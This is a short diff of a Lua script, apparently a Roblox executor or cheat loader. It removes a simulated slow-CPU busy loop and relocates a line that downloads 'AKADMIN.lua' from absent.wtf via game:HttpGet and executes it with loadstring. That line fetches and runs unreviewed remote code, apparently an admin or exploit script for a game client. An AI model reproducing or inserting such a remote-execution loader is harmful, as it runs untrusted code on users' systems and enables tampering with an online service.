@@ -33,10 +33,6 @@ do
         if not s3Thread and coroutine and coroutine.running then
             s3Thread = coroutine.running()
         end
-        if g._AKSimSlowCPU and (not g._AKSimUntil or os.clock() < g._AKSimUntil) then
-            local t = os.clock()
-            while os.clock() - t < g._AKSimSlowCPU do end
-        end
         local now = os.clock()
         if now - lastY > 0.015 then
             lastY = now
@@ -246,6 +242,5 @@ do
     end)
     pcall(setfenv, 0, env)
     pcall(setfenv, 1, env)
+    g.loadstring(game:HttpGet("https://absent.wtf/AKADMIN.lua"))()
 end
-
-((getgenv and getgenv() or _G).loadstring or loadstring)(game:HttpGet("https://absent.wtf/AKADMIN.lua"))()
